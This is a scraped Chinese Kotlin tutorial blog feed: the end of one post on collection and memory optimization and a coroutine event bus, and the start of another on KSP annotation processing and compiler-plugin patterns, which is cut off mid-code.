    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">calculateExpression</span><span class="hljs-params">(expression: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> {
            expression.contains(<span class="hljs-string">"+"</span>) -&gt; {
                <span class="hljs-keyword">val</span> parts = expression.split(<span class="hljs-string">"+"</span>)
                add(parts[<span class="hljs-number">0</span>].trim().toInt(), parts[<span class="hljs-number">1</span>].trim().toInt())
            }
            expression.contains(<span class="hljs-string">"*"</span>) -&gt; {
                <span class="hljs-keyword">val</span> parts = expression.split(<span class="hljs-string">"*"</span>)
                multiply(parts[<span class="hljs-number">0</span>].trim().toInt(), parts[<span class="hljs-number">1</span>].trim().toInt())
            }
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-keyword">throw</span> IllegalArgumentException(<span class="hljs-string">"不支持的表达式"</span>)
        }
    }
}
</code></pre>
<h4 data-id="heading-12"><strong>三十七、性能优化与最佳实践</strong></h4>
<h5 data-id="heading-13"><strong>1. 集合操作优化</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">collectionOptimization</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> numbers = (<span class="hljs-number">1.</span><span class="hljs-number">.1000000</span>).toList()
    
    <span class="hljs-comment">// 不好的写法：多次中间操作</span>
    <span class="hljs-keyword">val</span> badResult = numbers
        .filter { it % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> }
        .map { it * <span class="hljs-number">2</span> }
        .filter { it &gt; <span class="hljs-number">1000</span> }
        .take(<span class="hljs-number">10</span>)
    
    <span class="hljs-comment">// 好的写法：使用序列（惰性求值）</span>
    <span class="hljs-keyword">val</span> goodResult = numbers.asSequence()
        .filter { it % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> }
        .map { it * <span class="hljs-number">2</span> }
        .filter { it &gt; <span class="hljs-number">1000</span> }
        .take(<span class="hljs-number">10</span>)
        .toList()
    
    println(<span class="hljs-string">"结果: <span class="hljs-variable">$goodResult</span>"</span>)
}

<span class="hljs-comment">// 使用 groupBy 优化复杂操作</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> city: String)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">optimizeGrouping</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> people = listOf(
        Person(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>, <span class="hljs-string">"Beijing"</span>),
        Person(<span class="hljs-string">"Bob"</span>, <span class="hljs-number">30</span>, <span class="hljs-string">"Shanghai"</span>),
        Person(<span class="hljs-string">"Charlie"</span>, <span class="hljs-number">25</span>, <span class="hljs-string">"Beijing"</span>),
        Person(<span class="hljs-string">"Diana"</span>, <span class="hljs-number">30</span>, <span class="hljs-string">"Shanghai"</span>)
    )
    
    <span class="hljs-comment">// 按城市分组，然后按年龄分组</span>
    <span class="hljs-keyword">val</span> grouped = people.groupBy({ it.city }, { it.age })
    println(<span class="hljs-string">"分组结果: <span class="hljs-variable">$grouped</span>"</span>)
    
    <span class="hljs-comment">// 统计每个城市的平均年龄</span>
    <span class="hljs-keyword">val</span> averageAges = people.groupingBy { it.city }
        .fold(<span class="hljs-number">0.0</span>) { accumulator, element -&gt; 
            accumulator + element.age 
        }.mapValues { it.value / people.count { p -&gt; p.city == it.key } }
    
    println(<span class="hljs-string">"平均年龄: <span class="hljs-variable">$averageAges</span>"</span>)
}
</code></pre>
<h5 data-id="heading-14"><strong>2. 内存优化模式</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 使用对象池避免重复创建</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPool</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> available = mutableListOf&lt;Connection&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> inUse = mutableSetOf&lt;Connection&gt;()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getConnection</span><span class="hljs-params">()</span></span>: Connection {
        <span class="hljs-keyword">return</span> available.removeFirstOrNull()?.also { inUse.add(it) } 
            ?: Connection().also { inUse.add(it) }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">releaseConnection</span><span class="hljs-params">(connection: <span class="hljs-type">Connection</span>)</span></span> {
        inUse.remove(connection)
        available.add(connection)
    }
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">val</span> instance <span class="hljs-keyword">by</span> lazy { ConnectionPool() }
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Connection</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">connect</span><span class="hljs-params">()</span></span> = println(<span class="hljs-string">"连接建立"</span>)
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">disconnect</span><span class="hljs-params">()</span></span> = println(<span class="hljs-string">"连接关闭"</span>)
}

<span class="hljs-comment">// 使用 use 函数自动管理资源</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">readFileSafely</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 模拟资源管理</span>
    <span class="hljs-keyword">val</span> resource = <span class="hljs-keyword">object</span> : AutoCloseable {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">close</span><span class="hljs-params">()</span></span> = println(<span class="hljs-string">"资源已释放"</span>)
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">read</span><span class="hljs-params">()</span></span> = <span class="hljs-string">"文件内容"</span>
    }
    
    <span class="hljs-keyword">val</span> content = resource.use { 
        it.read() 
    }
    println(<span class="hljs-string">"内容: <span class="hljs-variable">$content</span>"</span>) <span class="hljs-comment">// 资源会自动关闭</span>
}
</code></pre>
<h4 data-id="heading-15"><strong>三十八、完整实战项目：构建事件总线系统</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlinx.coroutines.*
<span class="hljs-keyword">import</span> kotlinx.coroutines.channels.*
<span class="hljs-keyword">import</span> kotlinx.coroutines.flow.*
<span class="hljs-keyword">import</span> kotlin.reflect.KClass

<span class="hljs-comment">// 事件基类</span>
<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Event</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserLoggedIn</span>(<span class="hljs-keyword">val</span> userId: String) : Event()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreated</span>(<span class="hljs-keyword">val</span> orderId: String, <span class="hljs-keyword">val</span> amount: <span class="hljs-built_in">Double</span>) : Event()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentProcessed</span>(<span class="hljs-keyword">val</span> paymentId: String, <span class="hljs-keyword">val</span> success: <span class="hljs-built_in">Boolean</span>) : Event()
    <span class="hljs-keyword">object</span> SystemShutdown : Event()
}

<span class="hljs-comment">// 事件处理器接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">EventHandler</span>&lt;<span class="hljs-type">T : Event</span>&gt; {
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">T</span>)</span></span>
}

<span class="hljs-comment">// 事件总线</span>
<span class="hljs-keyword">object</span> EventBus {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> handlers = mutableMapOf&lt;KClass&lt;<span class="hljs-keyword">out</span> Event&gt;, MutableList&lt;EventHandler&lt;*&gt;&gt;&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> eventChannel = Channel&lt;Event&gt;(Channel.UNLIMITED)
    
    <span class="hljs-comment">// 注册事件处理器</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Event&gt;</span> <span class="hljs-title">registerHandler</span><span class="hljs-params">(eventClass: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;, handler: <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        handlers.getOrPut(eventClass) { mutableListOf() }.add(handler <span class="hljs-keyword">as</span> EventHandler&lt;*&gt;)
    }
    
    <span class="hljs-comment">// 发布事件</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">publish</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>)</span></span> {
        eventChannel.trySend(event)
    }
    
    <span class="hljs-comment">// 启动事件处理循环</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">start</span><span class="hljs-params">()</span></span> = GlobalScope.launch {
        <span class="hljs-keyword">for</span> (event <span class="hljs-keyword">in</span> eventChannel) {
            processEvent(event)
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processEvent</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>)</span></span> {
        <span class="hljs-keyword">val</span> eventClass = event::<span class="hljs-keyword">class</span>
        <span class="hljs-title class_">val</span> <span class="hljs-title">eventHandlers</span> = <span class="hljs-title">handlers</span>[<span class="hljs-title">eventClass</span>] ?: <span class="hljs-type">return</span>
        
        eventHandlers.forEach { handler -&gt;
            <span class="hljs-keyword">try</span> {
                <span class="hljs-meta">@Suppress(<span class="hljs-string">"UNCHECKED_CAST"</span>)</span>
                (handler <span class="hljs-keyword">as</span> EventHandler&lt;Event&gt;).handle(event)
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                println(<span class="hljs-string">"事件处理失败: <span class="hljs-subst">${e.message}</span>"</span>)
            }
        }
    }
}

<span class="hljs-comment">// 具体的事件处理器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserActivityLogger</span> : <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">Event.UserLoggedIn</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>.<span class="hljs-type">UserLoggedIn</span>)</span></span> {
        delay(<span class="hljs-number">100</span>) <span class="hljs-comment">// 模拟处理时间</span>
        println(<span class="hljs-string">"📝 用户登录日志: <span class="hljs-subst">${event.userId}</span> 在 <span class="hljs-subst">${System.currentTimeMillis()}</span> 登录"</span>)
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderProcessor</span> : <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">Event.OrderCreated</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>.<span class="hljs-type">OrderCreated</span>)</span></span> {
        delay(<span class="hljs-number">200</span>)
        println(<span class="hljs-string">"💰 订单处理: 订单 <span class="hljs-subst">${event.orderId}</span> 金额 <span class="hljs-subst">${event.amount}</span>"</span>)
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentNotifier</span> : <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">Event.PaymentProcessed</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>.<span class="hljs-type">PaymentProcessed</span>)</span></span> {
        delay(<span class="hljs-number">150</span>)
        <span class="hljs-keyword">val</span> status = <span class="hljs-keyword">if</span> (event.success) <span class="hljs-string">"成功"</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"失败"</span>
        println(<span class="hljs-string">"📧 支付通知: 支付 <span class="hljs-subst">${event.paymentId}</span> <span class="hljs-variable">$status</span>"</span>)
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SystemMonitor</span> : <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">Event.SystemShutdown</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>.<span class="hljs-type">SystemShutdown</span>)</span></span> {
        println(<span class="hljs-string">"🛑 系统关闭: 开始清理资源..."</span>)
        delay(<span class="hljs-number">500</span>)
        println(<span class="hljs-string">"🛑 系统关闭: 资源清理完成"</span>)
    }
}

<span class="hljs-comment">// 使用事件总线</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// 注册处理器</span>
    EventBus.registerHandler(Event.UserLoggedIn::<span class="hljs-keyword">class</span>, UserActivityLogger())
    EventBus.registerHandler(Event.OrderCreated::<span class="hljs-keyword">class</span>, OrderProcessor())
    EventBus.registerHandler(Event.PaymentProcessed::<span class="hljs-keyword">class</span>, PaymentNotifier())
    EventBus.registerHandler(Event.SystemShutdown::<span class="hljs-keyword">class</span>, SystemMonitor())
    
    <span class="hljs-comment">// 启动事件总线</span>
    EventBus.start()
    
    <span class="hljs-comment">// 模拟发布事件</span>
    EventBus.publish(Event.UserLoggedIn(<span class="hljs-string">"user123"</span>))
    EventBus.publish(Event.OrderCreated(<span class="hljs-string">"order456"</span>, <span class="hljs-number">99.99</span>))
    EventBus.publish(Event.PaymentProcessed(<span class="hljs-string">"pay789"</span>, <span class="hljs-literal">true</span>))
    EventBus.publish(Event.OrderCreated(<span class="hljs-string">"order999"</span>, <span class="hljs-number">49.99</span>))
    EventBus.publish(Event.PaymentProcessed(<span class="hljs-string">"pay000"</span>, <span class="hljs-literal">false</span>))
    
    delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// 等待事件处理完成</span>
    
    EventBus.publish(Event.SystemShutdown())
    delay(<span class="hljs-number">1000</span>)
    
    println(<span class="hljs-string">"程序结束"</span>)
}
</code></pre>
<h4 data-id="heading-16"><strong>下一步学习方向</strong></h4>
<p>你现在已经掌握了 Kotlin 的企业级开发技能！接下来可以深入：</p>
<ol>
<li><strong>Kotlin 编译器插件开发</strong>：自定义编译期处理</li>
<li><strong>Kotlin 元编程</strong>：在编译时生成代码</li>
<li><strong>Kotlin 与 Java 互操作高级技巧</strong>：类型映射、异常处理</li>
<li><strong>Kotlin 服务端开发</strong>：使用 Ktor、Spring Boot</li>
<li><strong>Kotlin 前端开发</strong>：使用 Compose for Web</li>
<li><strong>Kotlin 移动端开发</strong>：Compose Multiplatform</li>
</ol>
<p>这些高级特性将让你在 Kotlin 开发中游刃有余，能够构建复杂、高性能的企业级应用！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin-6]]></title>    <link>https://juejin.cn/post/7576086446460256291</link>    <guid>https://juejin.cn/post/7576086446460256291</guid>    <pubDate>2025-11-24T11:57:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576086446460256291" data-draft-id="7571281406510170163" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin-6"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-11-24T11:57:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风冷"/> <meta itemprop="url" content="https://juejin.cn/user/3843548379091742"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin-6
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548379091742/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风冷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:57:37.000Z" title="Mon Nov 24 2025 11:57:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>太棒了！现在让我们探索 Kotlin 的终极境界——<strong>元编程、编译器插件、深度优化</strong>和<strong>未来特性</strong>。这将带你进入 Kotlin 语言设计的核心领域。</p>
<hr/>
<h3 data-id="heading-0"><strong>Kotlin 终极探索：元编程与语言深度</strong></h3>
<h4 data-id="heading-1"><strong>三十九、注解处理器与代码生成（KSP）</strong></h4>
<h5 data-id="heading-2"><strong>1. 使用 KSP（Kotlin Symbol Processing）</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 定义注解</span>
<span class="hljs-meta">@Target(AnnotationTarget.CLASS)</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonSerializable</span>

<span class="hljs-meta">@Target(AnnotationTarget.PROPERTY)</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonName</span>(<span class="hljs-keyword">val</span> name: String)

<span class="hljs-meta">@Target(AnnotationTarget.PROPERTY)</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonExclude</span>

<span class="hljs-comment">// 2. 定义数据类（这些将在编译时被处理）</span>
<span class="hljs-meta">@JsonSerializable</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(
    <span class="hljs-meta">@JsonName(<span class="hljs-string">"person_name"</span>)</span>
    <span class="hljs-keyword">val</span> name: String,
    <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>,
    <span class="hljs-meta">@JsonExclude</span>
    <span class="hljs-keyword">val</span> password: String
)

<span class="hljs-comment">// 3. 手动模拟 KSP 处理结果（实际由注解处理器生成）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonSerializer</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toJson</span><span class="hljs-params">(person: <span class="hljs-type">Person</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> buildString {
            append(<span class="hljs-string">"{"</span>)
            append(<span class="hljs-string">""</span>person_name<span class="hljs-string">": "</span>${person.name}<span class="hljs-string">", "</span>)
            append(<span class="hljs-string">""</span>age<span class="hljs-string">": <span class="hljs-subst">${person.age}</span>"</span>)
            append(<span class="hljs-string">"}"</span>)
        }
    }
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fromJson</span><span class="hljs-params">(json: <span class="hljs-type">String</span>)</span></span>: Person {
            <span class="hljs-comment">// 简化的 JSON 解析逻辑</span>
            <span class="hljs-keyword">val</span> name = json.substringAfter(<span class="hljs-string">""</span>person_name<span class="hljs-string">": "</span><span class="hljs-string">").substringBefore("</span><span class="hljs-string">""</span>)
            <span class="hljs-keyword">val</span> age = json.substringAfter(<span class="hljs-string">""</span>age<span class="hljs-string">": "</span>).substringBefore(<span class="hljs-string">"}"</span>).toInt()
            <span class="hljs-keyword">return</span> Person(name, age, <span class="hljs-string">""</span>)
        }
    }
}

<span class="hljs-comment">// 4. 使用生成的序列化器</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testManualKSP</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> person = Person(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>, <span class="hljs-string">"secret"</span>)
    <span class="hljs-keyword">val</span> serializer = PersonSerializer()
    <span class="hljs-keyword">val</span> json = serializer.toJson(person)
    println(<span class="hljs-string">"生成的 JSON: <span class="hljs-variable">$json</span>"</span>)
    
    <span class="hljs-keyword">val</span> parsedPerson = PersonSerializer.fromJson(json)
    println(<span class="hljs-string">"解析的对象: <span class="hljs-variable">$parsedPerson</span>"</span>)
}
</code></pre>
<h5 data-id="heading-3"><strong>2. 构建时元编程模式</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 编译时验证注解</span>
<span class="hljs-meta">@Target(AnnotationTarget.CLASS)</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Validate</span>(<span class="hljs-keyword">val</span> fields: Array&lt;String&gt;)

<span class="hljs-meta">@Validate(fields = [<span class="hljs-string">"age"</span>, <span class="hljs-string">"email"</span>])</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> email: String)

<span class="hljs-comment">// 运行时验证逻辑（模拟编译时生成）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserValidator</span> {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">validate</span><span class="hljs-params">(user: <span class="hljs-type">User</span>)</span></span>: List&lt;String&gt; {
            <span class="hljs-keyword">val</span> errors = mutableListOf&lt;String&gt;()
            
            <span class="hljs-keyword">if</span> (user.age &lt; <span class="hljs-number">0</span>) errors.add(<span class="hljs-string">"年龄不能为负数"</span>)
            <span class="hljs-keyword">if</span> (!user.email.contains(<span class="hljs-string">"@"</span>)) errors.add(<span class="hljs-string">"邮箱格式不正确"</span>)
            
            <span class="hljs-keyword">return</span> errors
        }
    }
}

<span class="hljs-comment">// 使用编译时验证</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testValidation</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> user = User(<span class="hljs-string">"Bob"</span>, -<span class="hljs-number">5</span>, <span class="hljs-string">"invalid-email"</span>)
    <span class="hljs-keyword">val</span> errors = UserValidator.validate(user)
    
    <span class="hljs-keyword">if</span> (errors.isNotEmpty()) {
        println(<span class="hljs-string">"验证错误: <span class="hljs-subst">${errors.joinToString()}</span>"</span>)
    } <span class="hljs-keyword">else</span> {
        println(<span class="hljs-string">"验证通过"</span>)
    }
}
</code></pre>
<h4 data-id="heading-4"><strong>四十、编译器插件开发基础</strong></h4>
<h5 data-id="heading-5"><strong>1. 自定义编译器扩展模式</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 定义领域特定语言</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlBuilder</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> table: String = <span class="hljs-string">""</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> conditions = mutableListOf&lt;String&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> joins = mutableListOf&lt;String&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> limit: <span class="hljs-built_in">Int</span>? = <span class="hljs-literal">null</span>
    
